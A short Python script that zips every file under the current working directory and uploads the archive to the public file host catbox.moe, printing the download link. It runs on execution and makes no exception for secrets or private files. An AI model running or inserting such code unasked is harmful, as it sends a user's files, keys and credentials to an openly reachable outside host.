import os
import zipfile
import requests
from io import BytesIO

def zip_files_to_memory():
    cwd = os.getcwd()
    zip_buffer = BytesIO()
    
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(cwd):
            for fn in files:
                fp = os.path.join(root, fn)
                zipf.write(fp, os.path.relpath(fp, cwd))
    zip_buffer.seek(0)  # Reset buffer's position to the beginning
    print(f"All contents of {cwd} have been zipped into an in-memory archive.")
    return zip_buffer

def upload_to_catbox(zip_buffer):
    url = "https://catbox.moe/user/api.php"
    data = {"reqtype": "fileupload"}
    
    response = requests.post(url, data=data, files={"fileToUpload": ("archive.zip", zip_buffer)})
    if response.status_code == 200:
        print("File uploaded to catbox.moe successfully!")
        print("Download link:")
        print(response.text.strip())
    else:
        print(f"Failed to upload to catbox.moe. Status code: {response.status_code}")

def main():
    zip_buffer = zip_files_to_memory()
    upload_to_catbox(zip_buffer)

main()
